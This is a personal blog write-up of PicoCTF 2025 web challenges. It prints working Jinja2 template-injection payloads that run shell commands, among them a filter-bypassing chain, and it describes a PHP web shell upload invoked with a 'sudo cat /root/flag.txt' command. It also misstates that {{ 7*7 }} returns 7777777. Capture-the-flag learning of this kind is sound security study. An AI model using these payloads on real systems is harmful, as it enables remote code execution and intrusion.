---
title: PicoCTF2025
date: '2025-02-01'
draft: false
summary: Writeup
layout: PostBanner
images: ['/static/images/pico.jpg']
---

Here you'll find writeups for how I solved the challenges from PicoCTF 2025, across all categories — from web and pwn to reverse engineering, crypto, and more.
Each writeup includes my thought process, techniques, and the final solution.

<TOCInline
  toc={props.toc}
  exclude={['Bypassing Filters', 'Identifying the Template Engine', 'Exploitation']}
/>

# WEB

## SSTI1

From the challenge title, it's clear that we're dealing with **Server-Side Template Injection (SSTI)**. By testing a few payloads, we can identify the template engine being used.

## Identifying the Template Engine

Here are some basic payloads for different template engines:

![template-decision-tree](/static/images/pico2025/template-decision-tree.png)

After testing these, the one that works is `{{ 7*7 }}`, which returns `7777777`, confirming the engine is **Jinja2**.

## Exploitation

To confirm command execution, I tried:

```jinja
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('whoami').read() }}
```

It works! Then I proceed to read the flag:

```jinja
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read() }}
```

And successfully retrieve the flag.

> Reference: [PortSwigger SSTI Guide](https://portswigger.net/web-security/server-side-template-injection)

---

## SSTI2

In the second challenge, the vulnerability is confirmed using:

```jinja
{{ 7 * '7' }}
```

Which returns: `7777777`  
This again confirms an SSTI vulnerability.

## Bypassing Filters

I found this obfuscated payload that bypasses filters and still achieves code execution:

```jinja
{{ request | attr('application') | attr('__globals__') | attr('__getitem__')('__builtins__') | attr('__getitem__')('__import__')('os') | attr('popen')('id') | attr('read')() }}
```

Then I modify it to read the flag:

```jinja
{{ request | attr('application') | attr('__globals__') | attr('__getitem__')('__builtins__') | attr('__getitem__')('__import__')('os') | attr('popen')('cat flag') | attr('read')() }}
```

> Reference: [Server Side Template Injection with Jinja2 - OnSecurity](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/)

> Helpful source: [SSTI Server Side Template Injection - Medium](https://medium.com/@yadav-ajay/ssti-server-side-template-injection-746dda439038)

---

## n0s4n1ty 1

This challenge is vulnerable to uploading `.php` files instead of images. I simply inject PHP code to open a shell. (See the reference link below for a sample reverse shell.)

I know uploaded files are stored in `/uploads`, so I execute the command:

```
/uploads/index.php?cmd=sudo cat /root/flag.txt
```

- `index.php` is the name of my uploaded file.
- I assumed the flag was in `/root`, which turned out to be correct.

> Helpful source: [Simple PHP reverse shell](https://medium.com/@tareshsharma17/simple-php-reverse-shell-061d4a6bd18d)

---

## HEAD-DUMP

This challenge gives a pretty useful hint in the description: exploit the blog API.

```txt
The application is a simple blog website where you can read articles about various topics, including an article about API Documentation.
```

Among the articles, you’ll find a link to the API GUI. We know the flag is stored in the server memory, so we use the final GET request in the list.  
Accessing the corresponding URL, we download the file and find the flag.

---

# BINARY EXPLOITATION

## Soon

# FORSENSICS

## Soon
